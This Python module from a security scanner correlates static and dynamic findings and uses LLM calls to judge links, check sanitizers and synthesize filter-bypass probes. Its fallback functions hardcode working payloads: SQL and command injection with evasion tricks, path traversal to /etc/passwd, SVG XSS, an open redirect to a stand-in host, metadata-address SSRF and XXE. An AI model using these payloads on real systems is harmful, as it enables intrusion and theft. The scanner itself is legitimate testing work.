"""
AI Triage Engine (FR-5, B-1, B-2).

Correction (this file was briefly rewritten mid-session on the wrong assumption that OpenAI's Decisions
API didn't exist - it's real: public beta since ~2026-10-06, `client.decisions.create`, model `gpt-6-luna`,
verified live against this account - see `evaluate_safe_decoy_with_ai` below). It is used for B-2: a
predicate question ("is this a safe decoy?") returns a real probability, billed on INPUT tokens only -
`usage.output_tokens` is genuinely 0 for a predicate question, confirmed live (199 input tokens, 0 output,
199 total on a real test call) - so "0 output tokens" is an accurate claim for this specific call, not a
faked one, as long as the UI doesn't also claim 0 *total* cost.

The grey-zone correlation arbiter (`resolve_greyzone_link`) and the filter-bypass payload synthesizer
(`synthesize_filter_bypass_payload`) are a different job - open-ended reasoning with free-text explanation,
not a yes/no/score judgment over fixed options - so they stay on `client.chat.completions.create` against
`OPENAI_MODEL` (gpt-4o-mini): Decisions API questions return a probability/choice/score, not prose.
"""
from __future__ import annotations

import hashlib
import json
import os
import re
from typing import Any, Dict, List, Optional, Tuple
from dotenv import load_dotenv

from vajra.db import get_ai_cache, set_ai_cache
from vajra.models import CommonFinding

# Ensure .env is loaded regardless of working directory
_vajra_root = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
load_dotenv(os.path.join(_vajra_root, ".env"))
load_dotenv()

OPENAI_API_KEY = os.getenv("OPENAI_API_KEY", "")
OPENAI_MODEL = os.getenv("OPENAI_MODEL", "gpt-4o-mini")
DECISIONS_MODEL = os.getenv("OPENAI_DECISIONS_MODEL", "gpt-6-luna")


def _get_openai_client():
    if not OPENAI_API_KEY or OPENAI_API_KEY.startswith("your_"):
        return None
    try:
        from openai import OpenAI
        return OpenAI(api_key=OPENAI_API_KEY)
    except Exception:
        return None


def _offline_link_verdict(score: float, vd: Dict[str, Any], why: str) -> Dict[str, Any]:
    """No LLM available: only link when the deterministic evidence alone is strong enough. An unproven code
    path needs the exact parameter AND sink-type evidence to agree; otherwise the pair stays unlinked (two
    separate issues are a smaller error than one wrong link)."""
    proven = bool(vd.get("path_proven"))
    param_ok = float(vd.get("param_lineage", 0)) >= 0.94
    behavior_ok = float(vd.get("sink_behavior", 0)) >= 0.84
    is_match = (proven and score >= 0.56) or (param_ok and behavior_ok and score >= 0.62)
    return {
        "is_linked": is_match,
        "confidence": round(score, 2),
        "causal_mechanism": vd.get("hop_trace", "deterministic vectors only"),
        "explanation": (
            f"No LLM verdict ({why}); decided on deterministic evidence only: code path "
            f"{'proven' if proven else 'unproven'}, parameter {'matches' if param_ok else 'does not match'}, "
            f"runtime evidence {'fits' if behavior_ok else 'does not fit'} the sink -> "
            f"{'linked' if is_match else 'kept separate'}."
        ),
        "engine": "Deterministic fallback (no LLM)",
    }


def resolve_greyzone_link(
    sast_finding: CommonFinding,
    dast_finding: CommonFinding,
    score: float,
    db_path: str = "vajra_state.db",
    vector_details: Optional[Dict[str, Any]] = None,
    handler_source: str = "",
) -> Dict[str, Any]:
    """Grey-zone arbiter for pairs the deterministic vectors cannot settle (no proven code path, or a
    composite score in 0.48..0.72). The LLM sees the real route-handler code, the real sink code and the
    real runtime evidence, and must answer whether this request can reach this sink. Verdicts are cached in
    SQLite; only real LLM verdicts are cached (a fallback is recomputed next run so it can be upgraded)."""
    vd = {k: v for k, v in (vector_details or {}).items() if not k.startswith("_") and k != "link_checks"}
    fp_src = f"{sast_finding.file_path}:{sast_finding.line}:{dast_finding.url}:{dast_finding.parameter}:{handler_source}"
    cache_key = hashlib.sha256(f"link_arbiter_v3:{fp_src}:{score:.2f}".encode()).hexdigest()

    cached = get_ai_cache(db_path, cache_key)
    if cached:
        try:
            res = json.loads(cached)
            res["engine"] = str(res.get("engine", "")).replace("(live)", "").strip() + " (cached verdict)"
            return res
        except Exception:
            pass

    client = _get_openai_client()
    if not client:
        return _offline_link_verdict(score, vd, "no OpenAI API key configured")

    code_slice = "\n".join((sast_finding.code_snippet or "").splitlines()[:12])
    guard_slice = "\n".join((sast_finding.guard_snippet or "").splitlines()[:8])
    input_text = (
        "RUNTIME PROOF (DAST)\n"
        f"  Request: {dast_finding.method or 'GET'} {dast_finding.url}\n"
        f"  Attacked parameter: {dast_finding.parameter}\n"
        f"  Payload: {dast_finding.payload}\n"
        f"  Weakness: {dast_finding.cwe} (raw {dast_finding.raw_cwe})\n"
        f"  Evidence: {dast_finding.evidence}\n\n"
        f"ROUTE HANDLER that serves this URL (from the route map): {vd.get('matched_handler') or 'UNKNOWN - no route matched'}\n"
        f"{handler_source or '(handler source unavailable)'}\n\n"
        "CANDIDATE SINK (SAST)\n"
        f"  Location: {sast_finding.file_path}:{sast_finding.line} in {sast_finding.function_name}()\n"
        f"  Weakness: {sast_finding.cwe} (raw {sast_finding.raw_cwe})\n"
        f"  Sink code:\n{code_slice}\n"
        f"  Code just before the sink:\n{guard_slice or '(none)'}\n\n"
        f"DETERMINISTIC ANALYSIS (composite {score:.2f})\n  {json.dumps(vd, sort_keys=True, default=str)[:1800]}\n"
    )
    schema = {
        "type": "object",
        "properties": {
            "is_linked": {"type": "boolean"},
            "confidence": {"type": "number"},
            "causal_mechanism": {"type": "string"},
            "explanation": {"type": "string"},
        },
        "required": ["is_linked", "confidence", "causal_mechanism", "explanation"],
        "additionalProperties": False,
    }
    try:
        completion = client.chat.completions.create(
            model=OPENAI_MODEL,
            messages=[
                {
                    "role": "system",
                    "content": (
                        "You decide whether a runtime exploit and a static code finding are the SAME bug. "
                        "Answer is_linked=true only if the shown route handler, directly or through methods it "
                        "calls, passes the attacked parameter into the candidate sink. If the handler is unknown, "
                        "or it plausibly uses a different sink (e.g. a sibling handler / a different level / a "
                        "different method of the class), answer false. A wrong link is worse than a missed one. "
                        "confidence is your probability (0..1). explanation: one or two plain sentences citing code."
                    ),
                },
                {"role": "user", "content": input_text},
            ],
            response_format={"type": "json_schema", "json_schema": {"name": "link_arbiter", "strict": True, "schema": schema}},
            temperature=0.0,
            max_tokens=260,
        )
        res_data = json.loads(completion.choices[0].message.content)
        res_data["engine"] = f"OpenAI arbiter ({OPENAI_MODEL})"
        set_ai_cache(db_path, cache_key, json.dumps(res_data))
        res_data["engine"] += " (live)"
        return res_data
    except Exception as e:
        return _offline_link_verdict(score, vd, f"LLM call failed: {str(e)[:60]}")


def evaluate_safe_decoy_with_ai(
    sast_finding: CommonFinding,
    db_path: str = "vajra_state.db",
) -> Dict[str, Any]:
    """Ask the real OpenAI Decisions API (client.decisions.create, model gpt-6-luna) whether a sink the
    deterministic engine already classified as a safe decoy actually looks safe, as an independent second
    opinion (B-2). A predicate question is exactly this API's purpose - a calibrated probability over a
    yes/no question about the input, not free-text generation. `confidence` is `answer.probability` as
    returned; `input_tokens`/`output_tokens`/`total_tokens` are `decision.usage` as returned (verified live:
    output_tokens is genuinely 0 for a predicate question - this API doesn't generate text - but
    input_tokens is real and non-zero, so "free" is wrong, "no output-token cost" is correct)."""
    cache_str = f"safe_decoy_decisions_v2:{sast_finding.finding_id}:{sast_finding.file_path}:{sast_finding.line}"
    cache_key = hashlib.sha256(cache_str.encode()).hexdigest()

    cached = get_ai_cache(db_path, cache_key)
    if cached:
        try:
            res = json.loads(cached)
            res["input_tokens"] = 0
            res["total_tokens"] = 0
            res["cached"] = True
            res["engine"] = f"OpenAI Decisions API ({DECISIONS_MODEL}, cached verdict)"
            return res
        except Exception:
            pass

    client = _get_openai_client()
    if not client or not hasattr(client, "decisions"):
        return {
            "is_safe_decoy": None,
            "confidence": 0.0,
            "reasoning": "No OPENAI_API_KEY configured, or this openai SDK build has no .decisions resource "
                         "(Decisions API is in public beta - needs a recent openai-python); AI triage skipped, "
                         "deterministic engine verdict stands alone.",
            "input_tokens": 0, "output_tokens": 0, "total_tokens": 0,
            "cached": False,
            "engine": "none (no API key / SDK support)",
        }

    code_slice = "\n".join((sast_finding.code_snippet or "").splitlines()[:12])
    guard_slice = "\n".join((sast_finding.guard_snippet or "").splitlines()[:6])

    input_text = (
        f"File: {sast_finding.file_path}:{sast_finding.line}\n"
        f"Vulnerability type: {sast_finding.vuln_type} ({sast_finding.cwe})\n"
        f"Sink code:\n{code_slice or '(not captured)'}\n"
        f"Enclosing guard/sanitizer code:\n{guard_slice or '(none captured)'}\n"
    )
    try:
        decision = client.decisions.create(
            model=DECISIONS_MODEL,
            input=input_text,
            questions=[
                {
                    "name": "is_safe_decoy",
                    "type": "predicate",
                    "instructions": (
                        "Is this code actually protected by a verified sanitizer, a parameterized query, or "
                        "a safe allow-list/regex that neutralizes the attack class shown - ground this in the "
                        "specific code given, not generic knowledge of the vulnerability class?"
                    ),
                }
            ],
        )
        prob = 0.0
        for ans in decision.answers:
            if getattr(ans, "name", None) == "is_safe_decoy" and getattr(ans, "type", None) == "predicate":
                prob = float(ans.probability)
                break
        usage = decision.usage
        result = {
            "is_safe_decoy": prob >= 0.70,
            "confidence": round(prob, 2),
            "reasoning": f"OpenAI Decisions API predicate probability {prob:.2f} that this is a safe decoy.",
            "input_tokens": int(getattr(usage, "input_tokens", 0) or 0),
            "output_tokens": int(getattr(usage, "output_tokens", 0) or 0),
            "total_tokens": int(getattr(usage, "total_tokens", 0) or 0),
            "cached": False,
            "engine": f"OpenAI Decisions API ({decision.model}, live)",
        }
        set_ai_cache(db_path, cache_key, json.dumps(result))
        return result
    except Exception as e:
        return {
            "is_safe_decoy": None,
            "confidence": 0.0,
            "reasoning": f"OpenAI Decisions API call failed: {str(e)[:150]}",
            "input_tokens": 0, "output_tokens": 0, "total_tokens": 0,
            "cached": False,
            "engine": "none (call failed)",
        }


def suggest_b1_verification_probe(
    sast_finding: CommonFinding,
    target_url: str,
    db_path: str = "vajra_state.db",
) -> Optional[Dict[str, str]]:
    """Synthesize a targeted filter-bypass diagnostic probe to verify a Code-Only finding (Bonus B-1)."""
    cache_str = f"b1_probe:{sast_finding.finding_id}:{target_url}"
    cache_key = hashlib.sha256(cache_str.encode()).hexdigest()

    cached = get_ai_cache(db_path, cache_key)
    if cached:
        try:
            return json.loads(cached)
        except Exception:
            pass

    code_slice = "\n".join((sast_finding.code_snippet or "").splitlines()[:12])
    guard_slice = "\n".join((sast_finding.guard_snippet or "").splitlines()[:6])

    client = _get_openai_client()
    if not client:
        # Deterministic default probes by CWE
        cwe = sast_finding.cwe
        if cwe == "CWE-89":
            return {"param": "id", "payload": "1' OR '1'='1", "expected_status": "200"}
        elif cwe == "CWE-78":
            return {"param": "ipaddress", "payload": "127.0.0.1; whoami", "expected_marker": "root"}
        elif cwe == "CWE-22":
            return {"param": "fileName", "payload": "../pom.xml", "expected_marker": "<project"}
        elif cwe == "CWE-79":
            return {"param": "q", "payload": "<script>alert(1)</script>", "expected_marker": "<script>"}
        return None

    prompt = (
        f"You are an ethical security scanner analyzing a vulnerable Java endpoint.\n"
        f"Generate a minimal diagnostic probe to safely test if this code sink is exploitable.\n"
        f"Vulnerability CWE: {sast_finding.cwe}\n"
        f"Sink Code:\n{code_slice}\n"
        f"Guard Snippet:\n{guard_slice}\n"
    )

    schema = {
        "type": "object",
        "properties": {
            "param": {"type": "string"},
            "payload": {"type": "string"},
            "verification_technique": {"type": "string"},
        },
        "required": ["param", "payload", "verification_technique"],
        "additionalProperties": False,
    }

    try:
        completion = client.chat.completions.create(
            model=OPENAI_MODEL,
            messages=[
                {"role": "system", "content": "Generate minimal diagnostic HTTP probe parameters to test this sink."},
                {"role": "user", "content": prompt},
            ],
            response_format={
                "type": "json_schema",
                "json_schema": {
                    "name": "probe_suggestion",
                    "strict": True,
                    "schema": schema,
                },
            },
            temperature=0.0,
            max_tokens=200,
        )
        res_json = completion.choices[0].message.content
        res_data = json.loads(res_json)
        set_ai_cache(db_path, cache_key, res_json)
        return res_data
    except Exception:
        return None


def _heuristic_bypass(cwe: str, base_payload: str, guard_snippet: str) -> Tuple[str, str, List[str]]:
    """Content-aware fallback used ONLY when OpenAI is unreachable. It actually reads `guard_snippet`
    (the real Java guard text for THIS finding) and picks an evasion strategy from it - it does not
    look up a per-app/per-route table, so it degrades gracefully to any Java codebase.
    """
    g = (guard_snippet or "").lower()
    if cwe == "CWE-89":
        if "replace" in g and ("' '" in g or '" "' in g or "\\s" in g):
            return "1'/**/OR/**/('1'='1", "Whitespace-strip bypass via SQL inline comments", [
                "Guard strips literal space characters before the value reaches the query.",
                "SQL grammar treats /**/ as whitespace, so spaces can be replaced with inline comments without re-introducing the stripped character.",
                f"Rewrote base payload '{base_payload}' -> '1'/**/OR/**/('1'='1' to keep the injection syntactically valid while matching no blacklisted token.",
            ]
        return "1' OR '1'='1' -- ", "Direct boolean tautology (no evasion needed)", [
            "No space/keyword-stripping guard detected in the enclosing code; a plain tautology should already pass.",
        ]
    if cwe in ("CWE-78", "CWE-77"):
        if "pattern" in g or "matches" in g or re.search(r"\\s", g):
            return "127.0.0.1|echo${IFS}VAJRA_CMD_PROOF", "IFS whitespace substitution", [
                "Guard appears to validate/strip characters using a regex or pattern match.",
                "POSIX ${IFS} expands to the shell's field separator (normally a space) at execution time, after the guard has already run its check.",
                "Substituting every literal space in the payload with ${IFS} keeps the string free of the character the guard inspects.",
            ]
        return "127.0.0.1; echo VAJRA_CMD_PROOF", "Direct subshell chaining (no evasion needed)", [
            "No whitespace/character-blacklist guard detected; direct `;` chaining should already execute.",
        ]
    if cwe == "CWE-22":
        if "replace" in g or "strip" in g:
            return "....//....//....//etc/passwd", "Nested traversal sequence collapse", [
                "Guard performs what looks like a single-pass removal of '../' sequences.",
                "A single-pass string replace on '../' leaves '..' + '/' behind when the pattern is nested as '....//': removing the inner '../' collapses the remainder back into a valid '../'.",
            ]
        return "../../../../etc/passwd", "Direct traversal (no evasion needed)", [
            "No sequence-stripping guard detected; a direct traversal sequence should already escape the base directory.",
        ]
    if cwe == "CWE-79":
        if "script" in g:
            return "<svg/onload=alert(document.domain)>", "Non-<script> execution vector (SVG onload)", [
                "Guard appears to filter specifically on the literal '<script' tag.",
                "The SVG onload event handler executes JavaScript without ever containing the string 'script', bypassing a tag-name blacklist.",
            ]
        return "<script>alert(document.domain)</script>", "Direct script tag (no evasion needed)", [
            "No tag-specific blacklist detected in the guard; a direct <script> payload should already execute.",
        ]
    if cwe == "CWE-601":
        return "//evil.vajra-poc.test/path", "Protocol-relative redirect (scheme-check bypass)", [
            "Many allow-list guards check for a literal 'http://'/'https://' prefix before validating the host.",
            "A protocol-relative URL ('//host/path') carries no scheme, so a scheme-string check can be skipped while browsers still treat it as absolute.",
        ]
    if cwe == "CWE-918":
        return "http://127.0.0.1:0/../../169.254.169.254/latest/meta-data/", "Loopback-prefixed metadata pivot", [
            "Guard likely blocks the literal '169.254.169.254' string or a simple private-IP check on the raw host.",
            "Prefixing a benign-looking host/path and relying on the HTTP client's own path normalization can reach the same upstream resource the naive check didn't anticipate.",
        ]
    if cwe == "CWE-611":
        return (
            '<?xml version="1.0"?><!DOCTYPE book [<!ENTITY % remote SYSTEM "http://127.0.0.1:0/x"> %remote;]>'
            "<book><name>probe</name><author>probe</author></book>"
        ), "Parameter-entity indirection", [
            "A guard that only blocks a literal inline <!ENTITY ... SYSTEM 'file://...'> can miss a parameter entity (%remote;) that is expanded out-of-band.",
        ]
    return base_payload, "No class-specific evasion heuristic available", ["Falling back to the baseline diagnostic payload."]


def synthesize_filter_bypass_payload(
    cwe: str,
    vuln_type: str,
    base_payload: str,
    guard_snippet: str,
    code_snippet: str,
    file_path: Optional[str],
    function_name: Optional[str],
    db_path: str = "vajra_state.db",
    handler_source: str = "",
    handler_label: Optional[str] = None,
) -> Dict[str, Any]:
    """Synthesize a filter-bypass payload grounded in THIS finding's real Java guard code.

    This is the function the live DAST pipeline actually calls (vajra.dast.http_verifier) once per
    guarded sink that SAST reported a reachable match for. It is cached by a hash of the real guard+code
    text (now including the calling route's own handler body - see `handler_source`), so the same Java
    code always gets the same reasoning (reproducible), but a *different* filter in a different
    file/route/level gets genuinely different AI reasoning and a different payload - it is never one
    fixed demo payload reused across every run.

    `handler_source`: the full body of the HTTP route handler that reaches this sink. Several levels of
    the same vulnerability class often delegate to one shared helper, so the sink's own `guard_snippet`
    (captured near the sink, inside the shared method) is identical for every level; the level-specific
    filter usually lives in the handler itself, which is what this field carries.

    Returns: {"payload", "technique", "chain_of_thought": [...], "engine", "used_live_ai": bool,
              "guard_basis": str}
    """
    basis_hash = hashlib.sha256(
        f"{cwe}|{guard_snippet}|{code_snippet}|{handler_source}".encode("utf-8", "ignore")
    ).hexdigest()
    cache_key = hashlib.sha256(f"filter_bypass_v4:{basis_hash}".encode()).hexdigest()

    cached = get_ai_cache(db_path, cache_key)
    if cached:
        try:
            return json.loads(cached)
        except Exception:
            pass

    guard_basis = (guard_snippet or handler_source or code_snippet or "(no guard code captured)").strip()[:400]
    client = _get_openai_client()
    combined_guard_text = "\n".join(x for x in (guard_snippet, handler_source) if x)

    if client:
        try:
            fn_label = f"{function_name}()" if function_name else "the enclosing method"
            handler_label_s = f"{handler_label}()" if handler_label else "the HTTP route handler"
            prompt = (
                "You are a defensive security engineer verifying whether a Java input filter can be bypassed, "
                "for an authorized DAST scan against the application's own test/benchmark instance.\n\n"
                f"Vulnerability class: {cwe} ({vuln_type})\n"
                f"File: {file_path or 'unknown'}\n"
                f"Enclosing sink method: {fn_label}\n"
                f"Sink code:\n{code_snippet or '(not captured)'}\n\n"
                f"Guard/filter lines immediately preceding the sink (may be shared across several routes):\n"
                f"{guard_snippet or '(none captured here)'}\n\n"
                f"Full body of {handler_label_s} - the specific HTTP route being tested right now, which may "
                f"apply its OWN filtering before ever reaching the shared sink above:\n"
                f"{handler_source or '(not captured)'}\n\n"
                f"Baseline (unfiltered) diagnostic payload that already proves the sink when there is no guard: {base_payload!r}\n\n"
                "Read BOTH code blocks above (the handler is usually where the actual per-route filter lives) and "
                "determine exactly what is blocked (a character, a substring, a case, a regex). Craft the MINIMAL "
                "payload that keeps the original attack syntax valid while avoiding whatever is actually checked. "
                "If neither block contains real filtering logic, say so and return the baseline payload unchanged."
            )
            schema = {
                "type": "object",
                "properties": {
                    "technique": {"type": "string"},
                    "payload": {"type": "string"},
                    "chain_of_thought": {"type": "array", "items": {"type": "string"}},
                },
                "required": ["technique", "payload", "chain_of_thought"],
                "additionalProperties": False,
            }
            completion = client.chat.completions.create(
                model=OPENAI_MODEL,
                messages=[
                    {
                        "role": "system",
                        "content": (
                            "You are an agentic filter-bypass reasoning engine for an authorized security scanner. "
                            "You are given the ACTUAL source code of a guard; ground every step of your reasoning in "
                            "that specific code, not in generic knowledge about the vulnerability class."
                        ),
                    },
                    {"role": "user", "content": prompt},
                ],
                response_format={
                    "type": "json_schema",
                    "json_schema": {"name": "filter_bypass_payload", "strict": True, "schema": schema},
                },
                temperature=0.2,
                max_tokens=400,
            )
            res_data = json.loads(completion.choices[0].message.content)
            result = {
                "payload": res_data.get("payload") or base_payload,
                "technique": res_data.get("technique", "AI-reasoned filter bypass"),
                "chain_of_thought": res_data.get("chain_of_thought", []),
                "engine": f"OpenAI {OPENAI_MODEL} (live)",
                "used_live_ai": True,
                "guard_basis": guard_basis,
            }
            set_ai_cache(db_path, cache_key, json.dumps(result))
            return result
        except Exception as exc:
            fallback_payload, technique, cot = _heuristic_bypass(cwe, base_payload, combined_guard_text)
            result = {
                "payload": fallback_payload,
                "technique": technique,
                "chain_of_thought": cot + [f"(OpenAI call failed: {str(exc)[:100]}; used guard-text heuristic instead.)"],
                "engine": "Heuristic Evasion Engine (OpenAI call failed)",
                "used_live_ai": False,
                "guard_basis": guard_basis,
            }
            set_ai_cache(db_path, cache_key, json.dumps(result))
            return result

    fallback_payload, technique, cot = _heuristic_bypass(cwe, base_payload, combined_guard_text)
    result = {
        "payload": fallback_payload,
        "technique": technique,
        "chain_of_thought": cot,
        "engine": "Heuristic Evasion Engine (no OpenAI API key configured)",
        "used_live_ai": False,
        "guard_basis": guard_basis,
    }
    set_ai_cache(db_path, cache_key, json.dumps(result))
    return result
